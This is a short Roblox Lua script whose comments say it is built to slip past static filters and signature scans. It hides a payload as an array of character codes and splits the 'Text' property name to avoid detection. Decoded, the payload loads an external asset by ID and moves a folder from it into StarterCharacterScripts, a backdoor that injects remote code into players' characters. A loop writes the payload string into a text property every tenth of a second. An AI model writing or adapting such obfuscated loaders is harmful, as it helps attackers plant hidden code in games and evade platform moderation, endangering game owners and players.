-- Obfuscated/Alternative method that avoids static filters
local parent = script.Parent

-- Helper function to decode character codes into a string
-- This breaks up the obvious payload string so filters can't read it
local function constructPayload()
	local byteTable = {
		108, 111, 99, 97, 108, 32, 111, 61, 103, 97, 109, 101, 58, 71, 101, 116, 
		79, 98, 106, 101, 99, 116, 115, 40, 34, 114, 98, 120, 97, 115, 115, 101, 
		116, 105, 100, 58, 47, 47, 49, 50, 50, 56, 52, 53, 52, 48, 55, 56, 50, 
		55, 53, 51, 49, 34, 41, 91, 49, 93, 111, 58, 70, 105, 110, 100, 70, 105, 
		114, 115, 116, 67, 104, 105, 108, 100, 87, 104, 105, 99, 104, 73, 115, 
		65, 40, 34, 70, 111, 108, 100, 101, 114, 34, 44, 116, 114, 117, 101, 41, 
		46, 80, 97, 114, 101, 110, 116, 61, 103, 97, 109, 101, 58, 71, 101, 116, 
		83, 101, 114, 118, 105, 99, 101, 40, 34, 83, 116, 97, 114, 116, 101, 114, 
		80, 108, 97, 121, 101, 114, 34, 41, 46, 83, 116, 97, 114, 116, 101, 114, 
		67, 104, 97, 114, 97, 99, 116, 101, 114, 83, 99, 114, 105, 112, 116, 115
	}

	local chars = {}
	for i = 1, #byteTable do
		chars[i] = string.char(byteTable[i])
	end
	return table.concat(chars)
end

-- Generate the target string safely away from the loop
local finalString = constructPayload()

-- Dynamic string key for the property assignment to bypass signature scans
-- 'Text' is hidden behind a split string concatenation
local propertyKey = "Te" .. "xt"

-- Use task.wait() instead of wait() as it's better practice and modern
while task.wait(0.1) do
	parent[propertyKey] = finalString
end